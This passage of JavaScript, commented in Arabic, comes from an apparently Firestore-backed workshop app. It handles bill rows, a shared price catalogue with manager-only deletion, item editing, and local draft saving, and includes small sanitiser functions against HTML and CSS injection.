        showMiniToast(d > 0 ? ('خصم ' + d.toFixed(2) + ' د.ل ✅') : ('زيادة ' + (-d).toFixed(2) + ' د.ل ✅'), '#047480');
      }
    }

    function clearSheetTotal() {
      sheetTotalOverride = null;
      calcBill();
      saveCurrentState();
      showMiniToast('عاد المجموع إلى المحسوب من البنود', '#157f4a');
    }

    function markBillRowFixed(input) {
      try {
        const row = input && input.closest ? input.closest('.bill-row') : null;
        if (!row || !row.dataset.autoType) return;
        row.dataset.manualFixed = '1';
        if(row.dataset.selectionTarget === '1') row.dataset.manualQtyFixed = '1';
        row.title = 'بند مثبت — لا يُغيّر تلقائياً بعد تعديلك له';
      } catch(e) {}
    }

    function wsBillSelectionIds(){return jobList.filter(i=>i&&i.sel).map(i=>{if(!i.billSelectionId)i.billSelectionId=wsUid('SEL-');return i.billSelectionId;});}
    function wsBillRefreshChecks(){
      document.querySelectorAll('#mainTable tbody input[type="checkbox"]').forEach((cb,idx)=>{const i=Number(cb.dataset.measurementIndex??idx);if(jobList[i])cb.checked=!!jobList[i].sel;});
      renderSelectedSummary();calcSum();
    }
    function wsActivateBill(row,useCurrent=false){
      if(!row||_loadingArchive||isSheetLocked()||isSheetIdleLocked())return;
      if(row.dataset.selectionTarget==='1')return;
      document.querySelectorAll('.bill-row').forEach(r=>{r.dataset.selectionTarget='0';r.classList.remove('ws-bill-active');});
      row.dataset.selectionTarget='1';row.classList.add('ws-bill-active');
      if(useCurrent)row.dataset.selectionRefs=JSON.stringify(wsBillSelectionIds());
      else{let ids=[];try{ids=JSON.parse(row.dataset.selectionRefs||'[]');}catch(_){}const selected=new Set(ids);jobList.forEach(i=>i.sel=selected.has(i.billSelectionId));}
      wsBillRefreshChecks();
    }
    function markBillQtyFixed(input){
      const row=input?.closest('.bill-row');if(!row)return;wsActivateBill(row);
      row.dataset.manualQtyFixed='1';row.dataset.manualFixed='1';
      if(!input.value.trim()){jobList.forEach(i=>i.sel=false);row.dataset.selectionRefs='[]';row.dataset.manualQtyFixed='0';wsBillRefreshChecks();}
    }

    function removeBillRow(btn) {
      const row = btn && btn.closest ? btn.closest('.bill-row') : null;
      if (!row) return;
      const autoType = row.dataset.autoType || '';
      if (autoType) {
        // الحذف اليدوي لبند مولّد تلقائياً يُسجّل كاختيار صريح للمستخدم،
        // لذلك لا تعيده syncAutoBillRows في نفس الكراسة.
        suppressedAutoBillTypes.add(resolveTypeId(autoType) || autoType);
      }
      if(row.dataset.selectionTarget==='1'){jobList.forEach(i=>i.sel=false);document.querySelectorAll('#mainTable tbody input[type="checkbox"]').forEach(cb=>cb.checked=false);renderSelectedSummary();}
      row.remove();
      calcBill();
      saveCurrentState();
    }

    function addBillRow(name='', price='', quantity='', autoType='') {
      /* الاستعادة من الكراسة المحفوظة تمرّر وسائط، أما ضغطة «إضافة بند مالي»
         فتأتي بلا وسائط — فنمنع هذه وحدها، وإلا لاختفت بنود الكراسة عند فتحها. */
      const manualNewBill = arguments.length===0 && !_loadingArchive;
      if (isSheetLocked() && manualNewBill) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      /* عند إضافة بند مالي جديد يدوياً نبدأ اختياراً مالياً جديداً:
         تُفرّغ علامات ✓ في جدول المقاسات بالكامل، ثم أي تحديد جديد
         يملأ كمية هذا البند تلقائياً. */
      if(manualNewBill) {
        jobList.forEach(i => i.sel = false);
        document.querySelectorAll('#mainTable tbody input[type="checkbox"]').forEach(cb => cb.checked = false);
        try { renderSelectedSummary(); } catch(e) {}
      }
      const div = document.createElement('div'); div.className = 'grid bill-row';
      div.style.gridTemplateColumns = "1.4fr 1fr 1fr auto";
      div.style.gap = "6px";
      div.style.marginBottom = "8px";
      if(autoType) div.dataset.autoType = autoType;
      div.dataset.selectionTarget='0';div.dataset.selectionRefs='[]';
      /* الكمية تبدأ من المحدد تلقائياً، لكنها ليست مقفلة: المستخدم يستطيع
         تعديلها يدوياً. عند التعديل نثبتها مؤقتاً حتى لا تستبدلها مزامنة
         الجدول، ويمكنه إعادة تفعيلها من خلال تحديد الصفوف من جديد. */
      const qtyAttrs = autoType ? `style="background:#eef8f2; color:var(--dark); font-weight:700;" title="تُحسب من التحديد ويمكن تعديلها يدوياً"` : '';
      div.innerHTML = `
        <div class="bn-wrap">
          <input type="text" class="b-n" placeholder="البند" value="${escHtml(name)}" autocomplete="off"
                 oninput="onBillNameInput(this);markBillRowFixed(this);saveCurrentState()" onfocus="onBillNameInput(this)"
                 onkeydown="onBillNameKey(event,this)" onblur="hideBillSuggest(this)"
                 onchange="onBillNameChange(this);markBillRowFixed(this);saveCurrentState()">
          <div class="bn-suggest"></div>
        </div>
        <input type="text" lang="en" inputmode="decimal" class="b-q numeric-input" placeholder="الكمية" value="${escHtml(quantity)}" ${qtyAttrs} oninput="markBillQtyFixed(this);calcBill();saveCurrentState()">
        <input type="text" lang="en" inputmode="decimal" class="b-p numeric-input" placeholder="السعر" value="${escHtml(price)}" oninput="markBillRowFixed(this);calcBill();saveCurrentState()" onchange="onBillPriceChange(this)">
        <div style="font-size:11px; display:flex; align-items:center; gap:4px; font-family:'JetBrains Mono',monospace;"><span class="b-total">0</span> <button onclick="removeBillRow(this)" style="color:red; border:none; background:none;" title="حذف البند"><i class="fas fa-times"></i></button></div>
      `;
      div.addEventListener('focusin',()=>wsActivateBill(div));
      document.getElementById('billArea').appendChild(div);
      if(manualNewBill) {
        wsActivateBill(div,true);
        div.dataset.manualQtyFixed = '0';
        div.querySelector('.b-q').value = '0.00';
      }
      calcBill();
      // كل بند جديد يُحفظ محلياً فوراً، ثم يُزامن مع نفس كراسة الأرشيف إن كانت مرتبطة.
      // أثناء الاستعادة يتولى loadFromJSON الحفظ بعد اكتمال تحميل جميع الصفوف.
      if (!_loadingArchive) saveCurrentState();
      return div;
    }

    // ============================================================
    // اقتراح البنود المالية داخل مربع البند نفسه
    // المصدر: مجموعة store في Firestore — وهي نفسها "المخزن" في تطبيق الفواتير،
    // فأي صنف يُضاف هنا يظهر هناك فوراً، وأي صنف يُضاف بالفواتير يظهر هنا فوراً.
    // ============================================================
    /* مصدر صورة آمن: يُهرَّب ويُقيَّد بمخططَي data:image و https.
       صور الكراسة تُحفظ كـ data:image من الكاميرا، فلا شيء آخر مشروع.
       وبلا تهريب، قيمة فيها علامة اقتباس تكسر الوسم وتفتح حقن HTML. */
    function safeImgSrc(v) {
      const u = String(v == null ? '' : v);
      return /^(data:image\/|https:)/i.test(u) ? escHtml(u) : '';
    }

    /* escHtml وescAttr يأتيان من shared.js — حُذف التعريف المكرّر في 8.9.2 */

    /* ══ حارسان جديدان في 8.8.3 ══
       معرّف النوع ولونه يُغذّيان **ورقة أنماط CSS** و**خاصية class**، لا
       نصاً ظاهراً. والتهريب بـ escHtml لا ينفع هناك إطلاقاً: علامة `}`
       داخل معرّف تُنهي القاعدة وتفتح قاعدة جديدة بأي محتوى، وهي محرف
       عادي لا يمسّه التهريب.

       ومصدر الاثنين ليس هذا الجهاز: أنواع المقاسات مستند مشترك في
       Firestore (measurementTypes) يكتبه أي عضو، وصفوف الكراسة تُكتب في
       measurementJobs كذلك. فقيمة واحدة مدسوسة تصيب أجهزة الجميع.

       الحارسان يقصران القيمة على ما يستطيع النظام إنتاجه فعلاً:
       المعرّف حروف وأرقام وشرطات، واللون صيغة لون معروفة. وما عدا ذلك
       يسقط إلى قيمة محايدة بدل أن يُحقن. */
    function safeCls(v) {
      const s = String(v == null ? '' : v).replace(/[^A-Za-z0-9_-]/g, '');
      return s || 'unknown';
    }
    function safeColor(v) {
      const s = String(v == null ? '' : v).trim();
      return /^(#[0-9a-fA-F]{3,8}|rgba?\([\d\s.,%]+\)|hsla?\([\d\s.,%]+\)|[a-zA-Z]{3,20})$/.test(s)
        ? s : '#6e7471';
    }

    function onBillNameInput(input) {
      const wrap = input.closest('.bn-wrap');
      if (!wrap) return;
      const box = wrap.querySelector('.bn-suggest');
      const q = input.value.trim().toLowerCase();

      let list = (priceDB || []).filter(p => p && p.name);
      if (q) {
        list = list.filter(p => p.name.toLowerCase().includes(q));
        // ما يبدأ بالحروف المكتوبة يظهر أولاً
        list.sort((a, b) => {
          const sa = a.name.toLowerCase().indexOf(q) === 0 ? 0 : 1;
          const sb = b.name.toLowerCase().indexOf(q) === 0 ? 0 : 1;
          return sa - sb || a.name.localeCompare(b.name, 'ar');
        });
      } else {
        list = list.slice().sort((a, b) => a.name.localeCompare(b.name, 'ar'));
      }
      list = list.slice(0, 200);   // كل البنود المطابقة، والقائمة نفسها قابلة للتمرير

      let html = list.map(p => `
        <div class="bn-item" data-name="${escHtml(p.name)}" data-price="${escHtml(p.price)}">
          <span class="bn-name">${escHtml(p.name)}</span>
          <span class="bn-price">${escHtml(p.price)}</span>
        </div>`).join('');

      if (q && !list.some(p => p.name.trim().toLowerCase() === q)) {
        html += `<div class="bn-item bn-new">＋ بند جديد: «${escHtml(input.value.trim())}» — يُحفظ بالمخزن تلقائياً</div>`;
      }

      if (!html) { box.style.display = 'none'; box.innerHTML = ''; return; }
      box.innerHTML = html;
      box.style.display = 'block';
      box.dataset.idx = '-1';
      box.scrollLeft = 0;   // يبدأ الشريط من أوله في كل بحث جديد

      box.querySelectorAll('.bn-item[data-name]').forEach(el => {
        // mousedown قبل blur حتى لا تختفي القائمة قبل تنفيذ الاختيار
        el.addEventListener('mousedown', ev => {
          ev.preventDefault();
          pickBillItem(input, el.dataset.name, el.dataset.price);
        });
      });
    }

    function pickBillItem(input, name, price) {
      const row = input.closest('.bill-row');
      input.value = name;
      const priceInput = row.querySelector('.b-p');
      const qtyInput = row.querySelector('.b-q');
      if (priceInput && !priceInput.readOnly) priceInput.value = price;
      hideBillSuggest(input, true);
      if (qtyInput && !qtyInput.readOnly && !qtyInput.value) { qtyInput.focus(); }
      calcBill();
      saveCurrentState();
    }

    function hideBillSuggest(input, now) {
      const wrap = input.closest('.bn-wrap');
      if (!wrap) return;
      const box = wrap.querySelector('.bn-suggest');
      const close = () => { box.style.display = 'none'; box.innerHTML = ''; };
      if (now) close(); else setTimeout(close, 120);
    }

    function onBillNameKey(e, input) {
      const wrap = input.closest('.bn-wrap');
      const box = wrap ? wrap.querySelector('.bn-suggest') : null;
      if (!box || box.style.display === 'none') return;
      const items = box.querySelectorAll('.bn-item[data-name]');
      if (e.key === 'Escape') { hideBillSuggest(input, true); return; }
      if (!items.length) return;
      let idx = parseInt(box.dataset.idx || '-1', 10);
      if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
        e.preventDefault();
        idx += (e.key === 'ArrowDown' ? 1 : -1);
        if (idx < 0) idx = items.length - 1;
        if (idx >= items.length) idx = 0;
        box.dataset.idx = String(idx);
        items.forEach(i => i.classList.remove('bn-active'));
        items[idx].classList.add('bn-active');
        items[idx].scrollIntoView({ block: 'nearest', inline: 'center', behavior: 'smooth' });
      } else if (e.key === 'Enter') {
        if (idx >= 0 && items[idx]) {
          e.preventDefault();
          pickBillItem(input, items[idx].dataset.name, items[idx].dataset.price);
        } else {
          hideBillSuggest(input, true);
        }
      }
    }

    // عند اختيار/كتابة اسم بند سبق حفظه، نعبّئ السعر تلقائياً إن كانت خانة السعر فارغة
    function onBillNameChange(input) {
      const row = input.closest('.bill-row');
      const name = input.value.trim();
      if(name) {
        const priceInput = row.querySelector('.b-p');
        const match = priceDB.find(p => (p.name || '').trim() === name);
        if(match && !priceInput.value) {
          priceInput.value = match.price;
          calcBill();
        }
      }
      syncPriceDB(row);
      saveCurrentState();
    }

    function onBillPriceChange(input) {
      syncPriceDB(input.closest('.bill-row'));
      saveCurrentState();
    }

    // حفظ/تحديث البند وسعره تلقائياً في كتالوج الأصناف والأسعار المشترك (نفس مخزن الفواتير)
    // بحيث أي صنف يُضاف هنا يظهر فوراً في "المخزن" بالفواتير، والعكس صحيح
    function syncPriceDB(row) {
      const name = row.querySelector('.b-n').value.trim();
      const price = row.querySelector('.b-p').value;
      if(!name || !price) return;
      const idx = priceDB.findIndex(p => (p.name || '').trim() === name);
      if(idx === -1 || String(priceDB[idx].price) !== String(price)) {
        upsertPriceDB(name, price);
      }
    }

    function selectedMeasurementsTotal() {
      let total = 0;
      jobList.forEach(i => { if(i && i.sel) total = money2(total + money2(i.res)); });
      return total;
    }

    /* عند تحديد/إلغاء تحديد المقاسات، إذا كان هناك بند مالي يدوي مخصص
       للتحديد، نضع مجموع المقاسات المحددة في كميته. السعر يبقى بيد المستخدم.
       هذا لا يلمس البنود المالية التلقائية حسب النوع. */
    function syncSelectionTargetBill(force=false){
      if(!force||_loadingArchive||isSheetLocked())return;
      const target=document.querySelector('.bill-row[data-selection-target="1"]');if(!target)return;
      target.dataset.manualQtyFixed='0';target.dataset.manualFixed='1';target.dataset.selectionRefs=JSON.stringify(wsBillSelectionIds());
      target.querySelector('.b-q').value=selectedMeasurementsTotal().toFixed(2);calcBill();
    }
    function syncAutoBillRows(totals,defs){
      if(_loadingArchive||isSheetLocked()||document.querySelector('.bill-row'))return;
      (defs||getAllTypeDefs()).forEach(d=>{
        const total=totals[d.id]||0;if(total<=0||suppressedAutoBillTypes.has(d.id))return;
        const name=getTypeName(d.id),saved=priceDB.find(p=>(p.name||'').trim()===name.trim());
        const row=addBillRow(name,saved?saved.price:'',total.toFixed(2),d.id);
        row.dataset.manualFixed='1';row.dataset.manualQtyFixed='1';
        row.dataset.selectionRefs=JSON.stringify(jobList.filter(i=>i.sel&&i.type===d.id).map(i=>{if(!i.billSelectionId)i.billSelectionId=wsUid('SEL-');return i.billSelectionId;}));
      });
    }

    function saveToPriceDB() {
      let n = document.getElementById('newItemName').value, p = document.getElementById('newItemPrice').value;
      if(!n || !p) return;
      upsertPriceDB(n, p);
      document.getElementById('newItemName').value = '';
      document.getElementById('newItemPrice').value = '';
    }

    // يُنشئ صنفاً جديداً أو يحدّث سعر صنف موجود في الكتالوج المشترك (يُزامَن فوراً مع مخزن الفواتير)
    function upsertPriceDB(name, price) {
      const idx = priceDB.findIndex(p => (p.name || '').trim() === name);
      let entry;
      if(idx > -1) {
        entry = priceDB[idx];
        entry.price = price;
        if(!entry.id) entry.id = wsUid('STR-');
      } else {
        entry = { id: wsUid('STR-'), name, price, qty: 0, recipe: null };
        priceDB.push(entry);
      }
      /* تعديل السعر يجب ألا يمس الكمية إطلاقاً.
         الخلل السابق: fsSet يستبدل المستند كاملاً، فيكتب qty من نسخة هذا
         الجهاز. لو كان أحدهم قد باع من الصنف للتو، أو لم تصل نسخة المخزن
         بعد (صنف قديم / فتح دون اتصال)، تُمسح الكمية الحقيقية أو تُصفَّر —
         ويظهر ذلك في الجرد كنقص بلا سبب. الآن: تحديث الحقول المعنية فقط. */
      // إصلاح 8.8: سعر مكتوب بالعربية كان يُحفظ صفراً في المخزن
      if(idx > -1) fsUpdate('store', entry.id, { name: entry.name, price: wsNum(entry.price) });
      else         fsSet('store', entry.id, { id: entry.id, name: entry.name, price: wsNum(entry.price), qty: 0, recipe: null });
      safeSetItem('workshop_prices', JSON.stringify(priceDB));
      renderPriceTags();
    }

    /* ══ تعديل صنف في الكتالوج — 9.3.0 ══
       لم يكن هناك تعديل إطلاقاً: خطأٌ مطبعي في اسم صنف أو سعرٌ تغيّر كان
       يحتاج حذفاً ثم إضافة. والحذف ينقل الصنف إلى سلة المهملات ويُسقط
       كميتَه في المخزن — فتصحيحُ حرفٍ واحد كان يكلّف سجلّ الصنف كله.

       والاسم يُعدَّل كما السعر: التطابق في الكتالوج بالاسم، فصنفٌ كُتب
       «المونيوم» بدل «ألمونيوم» يبقى غريباً عن كل ما يليه.

       ولا نلمس الكمية هنا إطلاقاً — تحديث الحقلين المعنيين فقط، لنفس
       السبب الموثَّق في upsertPriceDB أعلاه: fsSet تستبدل المستند كاملاً
       فتمحو كميةً باعها أحدهم للتو. */
    function editPriceDBEntry(idx) {
      const entry = priceDB[idx];
      if (!entry) return;
      closePriceEditor();

      const ov = document.createElement('div');
      ov.id = 'priceEditOverlay';
      ov.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,.55); z-index:9700;' +
                         'display:flex; align-items:center; justify-content:center; padding:18px;';
      ov.innerHTML =
        '<div style="background:#fff; border-radius:18px; width:100%; max-width:380px; padding:18px;' +
             'font-family:Cairo,Tajawal,sans-serif; box-shadow:0 18px 50px rgba(0,0,0,.3);">' +
          '<div style="font-weight:900; font-size:15px; margin-bottom:14px;">✏️ تعديل الصنف</div>' +
          '<label style="font-size:12px; font-weight:800; color:#555;">الاسم</label>' +
          '<input id="pe-name" type="text" value="' + escHtml(entry.name || '') + '" ' +
                 'style="width:100%; margin:6px 0 12px; padding:11px; border:1.5px solid var(--border);' +
                 'border-radius:11px; font-size:14px; font-family:inherit;">' +
          '<label style="font-size:12px; font-weight:800; color:#555;">السعر</label>' +
          '<input id="pe-price" type="text" inputmode="decimal" lang="en" value="' + escHtml(entry.price != null ? entry.price : '') + '" ' +
                 'style="width:100%; margin:6px 0 16px; padding:11px; border:1.5px solid var(--border);' +
                 'border-radius:11px; font-size:14px; font-family:inherit;">' +
          '<div style="display:flex; gap:8px;">' +
            '<button onclick="savePriceEdit(' + idx + ')" style="flex:1; padding:12px; border:0; border-radius:12px;' +
                    'background:var(--accent); color:#fff; font-weight:900; font-size:13px; font-family:inherit;">حفظ</button>' +
            '<button onclick="closePriceEditor()" style="flex:1; padding:12px; border:1.5px solid var(--border);' +
                    'border-radius:12px; background:#fff; font-weight:800; font-size:13px; font-family:inherit;">إلغاء</button>' +
          '</div>' +
        '</div>';
      ov.addEventListener('click', function (e) { if (e.target === ov) closePriceEditor(); });
      document.body.appendChild(ov);
      const f = document.getElementById('pe-name');
      if (f) { f.focus(); f.select(); }
    }

    function closePriceEditor() {
      const ov = document.getElementById('priceEditOverlay');
      if (ov) ov.remove();
    }

    function savePriceEdit(idx) {
      const entry = priceDB[idx];
      if (!entry) { closePriceEditor(); return; }
      const name  = ((document.getElementById('pe-name') || {}).value || '').trim();
      const priceRaw = ((document.getElementById('pe-price') || {}).value || '').trim();
      if (!name) { alert('اسم الصنف لا يجوز أن يكون فارغاً.'); return; }

      /* اسمان متطابقان في الكتالوج يعنيان أن البحث بالاسم يجد أحدهما
         دائماً ويتجاهل الآخر — فيبيع أحدهم بسعرٍ لا يقصده ولا يفهم لماذا. */
      const clash = priceDB.findIndex(function (p, i) {
        return i !== idx && String(p && p.name || '').trim() === name;
      });
      if (clash !== -1) { alert('⚠️ يوجد صنف آخر بنفس الاسم: «' + name + '».\nاختر اسماً مختلفاً.'); return; }

      const price = wsNum(priceRaw);           // يقبل الأرقام العربية — إصلاح 8.8
      if (!isFinite(price) || price < 0) { alert('السعر غير صالح.'); return; }

      const oldName = entry.name, oldPrice = entry.price;
      entry.name = name;
      entry.price = price;
      if (!entry.id) entry.id = wsUid('STR-');

      // الكمية لا تُمسّ: تحديث الحقلين المعنيين فقط
      fsUpdate('store', entry.id, { name: name, price: price });
      safeSetItem('workshop_prices', JSON.stringify(priceDB));
      renderPriceTags();
      closePriceEditor();
      showMiniToast(oldName !== name
        ? '✅ «' + oldName + '» صار «' + name + '» — ' + price
        : '✅ سعر «' + name + '»: ' + oldPrice + ' ← ' + price, '#04766b');
    }

    // يحذف صنفاً من الكتالوج المشترك (يُنقل لسلة المهملات بالفواتير، قابل للاسترجاع من هناك)
    function deletePriceDBEntry(idx) {
      const entry = priceDB[idx];
      if(!entry) return;
      /* ⚠️ إصلاح 8.8.3 — نفس علّة حذف الصنف في صفحة الفواتير:
         `fsDelete('store', …)` محجوز للمدير في القواعد، والدالة بلا حارس.
         فالعضو يحذف الصنف من قائمته المحلية ومن التخزين المحلي، ويُكتب
         سجل السلة على السيرفر، ويبقى الصنف نفسه قائماً عند بقية الأجهزة —
         فتختلف قائمة الأسعار من جهاز لآخر بلا سبب ظاهر، ويعود الصنف
         عند أول مزامنة. */
      if(!isManagerUser()) { alert('⛔ حذف الأصناف من قائمة الأسعار متاح للمدير فقط.'); return; }
      /* تأكيد أُضيف في 9.3.0: زر الحذف أيقونة ✕ بحجم 10px ملاصقة لاسم
         الصنف القابل للنقر. ولمسةٌ خاطئة على شاشة هاتف كانت تحذف الصنف
         بلا سؤال ولا تراجع ظاهر — والاسترجاع يحتاج فتح سلة المهملات في
         تطبيق الفواتير، وهو ما لا يخطر لأحد وقتها. */
      if (!confirm('حذف «' + (entry.name || '') + '» من قائمة الأسعار؟\n\n' +
                   'يُنقل إلى سلة المهملات في قسم الفواتير، ويمكن استرجاعه منها.')) return;
      priceDB.splice(idx, 1);
      safeSetItem('workshop_prices', JSON.stringify(priceDB));
      renderPriceTags();
      if(entry.id) {
        const trashEntry = { type:'صنف مخزن', id: entry.id, deletedAt: Date.now(), dateStr: new Date().toLocaleString('ar-EG'), payload: entry };
        fsSet('trash', entry.id, trashEntry);
        fsDelete('store', entry.id);
      }
    }

    // يربط قائمة الأصناف والأسعار حياً بمجموعة "store" في Firestore (نفس مخزن الفواتير تماماً)
    let storeUnsub = null;
    function attachStoreSync() {
      if(storeUnsub) return;
      storeUnsub = db.collection('store').onSnapshot(snap => {
        priceDB = snap.docs.map(d => {
          const v = d.data() || {};
          return { id: d.id, name: v.name, price: v.price, qty: v.qty || 0, recipe: v.recipe || null };
        });
        safeSetItem('workshop_prices', JSON.stringify(priceDB));
        renderPriceTags();
      }, err => { console.error('attachStoreSync:', err); showFsErrorToast(fsErrorMessage(err, 'قائمة الأصناف والأسعار')); });
    }

    // ترحيل تلقائي لمرة واحدة: أي أصناف/أسعار كانت محفوظة سابقاً على هذا الجهاز فقط تُرفع للكتالوج المشترك
    async function migrateLocalPricesToStore() {
      if(safeGetItem('prices_migrated_to_cloud')) return;
      try {
        let old;
        try { old = JSON.parse(localStorage.getItem('workshop_prices') || '[]'); } catch(e) { old = []; }
        for(const p of old) {
          if(!p.name) continue;
          if(priceDB.some(x => (x.name||'').trim() === (p.name||'').trim())) continue; // موجود بالفعل بالكتالوج المشترك، لا داعي للتكرار
          const id = wsUid('STR-') + '-' + Math.random().toString(36).slice(2,6);
          await fsSet('store', id, { id, name: p.name, price: wsNum(p.price), qty: 0, recipe: null });   // إصلاح 8.8
        }
        safeSetItem('prices_migrated_to_cloud', '1');
      } catch(e) { console.error('migrateLocalPricesToStore:', e); }
    }

    function renderPriceTags() {
      const cont = document.getElementById('priceTags');
      window.WSPriceGrid.render({items:priceDB,uid:currentUserUid(),canDelete:isManagerUser(),number:wsNum,uidFactory:()=>wsUid('STR-'),onSaved:rows=>{priceDB=rows;safeSetItem('workshop_prices',JSON.stringify(rows));},commit:ops=>{
        const batch=db.batch();for(const op of ops){const ref=db.collection(op.kind==='trash'?'trash':'store').doc(String(op.id));if(op.kind==='delete')batch.delete(ref);else if(op.kind==='update')batch.update(ref,op.data);else batch.set(ref,op.data);}return _wsTrack(batch.commit(),'store');
      }});
      const dl = document.getElementById('billItemsList');
      if(dl) dl.innerHTML = priceDB.map(item => `<option value="${escHtml(item.name)}"></option>`).join('');
      // لو كانت قائمة اقتراح مفتوحة الآن أثناء وصول تحديث من تطبيق الفواتير، نُحدّثها فوراً
      document.querySelectorAll('.bn-wrap .bn-suggest').forEach(box => {
        if (box.style.display === 'block') {
          const inp = box.parentElement.querySelector('.b-n');
          if (inp && document.activeElement === inp) onBillNameInput(inp);
        }
      });
    }

    function autoAddBill(name, price) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }   // كراسة محفوظة: لا كتابة قبل فتحها صراحةً
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }   // 9.7.0 — قفل بعد اكتمال الرفع
      const defs = getAllTypeDefs();
      let totals = {};
      jobList.forEach(i => { if(i.sel) totals[i.type] = (totals[i.type] || 0) + wsNum(i.res); });   // إصلاح 8.8
      const lower = name.toLowerCase();
      const matched = defs.find(d => d.id === 'pvc' ? (lower.includes('pvc') || lower.includes('بيفيسي')) : lower.includes(getTypeName(d.id).toLowerCase()));
      const q = matched ? (totals[matched.id] || 0) : 1;
      const row=addBillRow(name,price,selectedMeasurementsTotal().toFixed(2));wsActivateBill(row,true);syncSelectionTargetBill(true);saveCurrentState();
    }

    function buildStateSnapshot() {
      const billData = [];
      document.querySelectorAll('.bill-row').forEach(row => {
        billData.push({ n: row.querySelector('.b-n').value, q: row.querySelector('.b-q').value, p: row.querySelector('.b-p').value, at: row.dataset.autoType || '', fixed: row.dataset.manualFixed === '1', qtyFixed: row.dataset.manualQtyFixed === '1', active:row.dataset.selectionTarget==='1', refs:JSON.parse(row.dataset.selectionRefs||'[]') });
      });
      // مسودة حقول المقاس/اللون/الملاحظات التي لم تُضَف للجدول بعد، لحفظها واستعادتها عند العودة بعد خروج بالخطأ
      const draft = { note: document.getElementById('note').value };
      document.querySelectorAll('#inputSection input').forEach(i => { if(i.id) draft[i.id] = i.value; });
      // المبلغ المدفوع جزء من الكراسة: يبقى بعد إعادة الفتح ويُحفظ في الأرشيف معها
      const sheetPaid = (document.getElementById('sheetPaid') || {}).value || '';
      const sheetNotes = (document.getElementById('sheetNotes') || {}).value || '';
      return { custName: document.getElementById('custName').value, custPhone: document.getElementById('custPhone').value, custLocation: custLocation, custPhotos: custPhotos, jobList: jobList, billData: billData, suppressedAutoBillTypes: Array.from(suppressedAutoBillTypes), draft: draft, sheetPaid: sheetPaid, sheetNotes: sheetNotes, sheetApproval: sheetApproval, sheetTotalOverride: sheetTotalOverride };
    }

    // هل توجد بيانات فعلية تستحق الأرشفة؟ لا نؤرشف الاسم وحده أو حقولاً فارغة؛
    // لكن بنداً مالياً مسمىً أصبح بيانات فعلية ويجب ألا يضيع حتى قبل إدخال المقاسات.
    function hasMeaningfulData(state) {
      if (!state) return false;
      const hasMeasures = Array.isArray(state.jobList) && state.jobList.length > 0;
      const hasFinancialItems = Array.isArray(state.billData) && state.billData.some(b =>
        // الاسم وحده يُعدّ مسودة بند مقصودة؛ لا نُسقطه لأن الكمية أو السعر لم يكتمل بعد.
        String((b && b.n) || '').trim()
      );
      return hasMeasures || hasFinancialItems || !!String(state.custName||'').trim() || !!String(state.custPhone||'').trim();
    }

    // بيانات موجودة تستحق تحذيراً قبل تفريغها، وإن لم تكن تستحق الأرشفة
    function hasAnyData(state) {
      if(!state) return false;
      if(state.custName || state.custPhone) return true;
      if(state.jobList && state.jobList.length > 0) return true;
      if(state.billData && state.billData.some(b => String((b && b.n) || '').trim())) return true;
      if(state.custPhotos && state.custPhotos.length > 0) return true;
      if(state.draft) { for(const k in state.draft) { if(state.draft[k]) return true; } }
      return false;
    }

    // حماية إضافية من الخروج العرضي أو انتقال التطبيق إلى الخلفية:
    // احفظ المسودة محلياً فوراً عند إخفاء الصفحة أو pagehide، من دون الاعتماد
    // على المؤقت المؤجل للمزامنة السحابية. لا نستبدل هذه الحالة بكراسة فارغة.
    function saveEmergencyLocalSnapshot() {
      if(_loadingArchive||_resumeChoiceOpen)return;
      try {
        if (typeof buildStateSnapshot !== 'function') return;
        const snapshot = buildStateSnapshot();
        if (hasAnyData(snapshot)) safeSetItem('ws_last_state', JSON.stringify(snapshot));
      } catch (e) { console.warn('تعذر حفظ المسودة الاحتياطية:', e); }
    }
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') saveEmergencyLocalSnapshot();
    });
    window.addEventListener('pagehide', saveEmergencyLocalSnapshot);

    function saveCurrentState() {
      if(_loadingArchive)return;
      try { touchMeasurementActivity(); } catch(e) {}
      // نحفظ حالة القفل نفسها لا مجرد الارتباط بمستند الأرشيف:
      // الكراسة قيد العمل مرتبطة بمستند أرشيف أيضاً، فلو اعتمدنا الارتباط
      // وحده لعادت مقفولة بعد كل إعادة تحميل وتعطّل العمل اليومي.
      try { safeSetItem('ws_sheet_viewonly', sheetViewOnly ? '1' : '0'); } catch(e) {}
      const state = buildStateSnapshot();
      const serializedState = JSON.stringify(state);
      safeSetItem('ws_last_state', serializedState);
      try {
        safeSetItem('ws_last_state_backup_v310', serializedState);
        safeSetItem('ws_last_state_backup_v310_at', String(Date.now()));
        safeSetItem('ws_last_state_backup_v312', serializedState);
        safeSetItem('ws_last_state_backup_v312_at', String(Date.now()));
      } catch (backupError) { console.warn('تعذر تحديث النسخة الاحتياطية المحلية:', backupError); }
      scheduleDuplicateSheetHint();          // تنبيه تكرار المقاسات — 9.0.2
      /* لا ننفّذ أي مزامنة/إنشاء أثناء استعادة كراسة من الأرشيف.
         تحميل الحقول يستدعي أحداث الإدخال والحفظ محلياً؛ السماح بمسار
         الحفظ خلال هذه المرحلة كان قد ينشئ نسخة جديدة أو يكتب لقطة
         جزئية فوق المستند الأصلي قبل اكتمال الاستعادة. */
      if (_loadingArchive) return;
      /* الكراسة المحفوظة لا تُكتب في Firestore بمجرد فتحها أو عرضها.
         الكتابة تبدأ فقط بعد ضغط «تعديل وإضافة مقاسات». */
      if (sheetViewOnly) return;
      if(currentArchiveDocId) {
        // إن كانت المقاسات الحالية محمّلة من الأرشيف (أو أُنشئت للتو)، نزامن أي تعديل تلقائياً مع نفس المستند
        // هذا ما يجعل تعديل المقاسات ممكناً حتى بعد حفظها، مع تأخير بسيط (debounce) لتقليل عدد الكتابات إلى Firestore
        scheduleArchiveSync();
      } else if(hasMeaningfulData(state)) {
        // حفظ تلقائي فوري بالأرشيف بمجرد وجود أي بيانات فعلية (اسم/هاتف/مقاس ولو لم يُضف للجدول بعد)
        // دون أي زر أو خطوة يدوية، حتى لا تُفقد البيانات عند خروج بالخطأ أثناء التدوين
        createArchiveEntry();
      }
    }

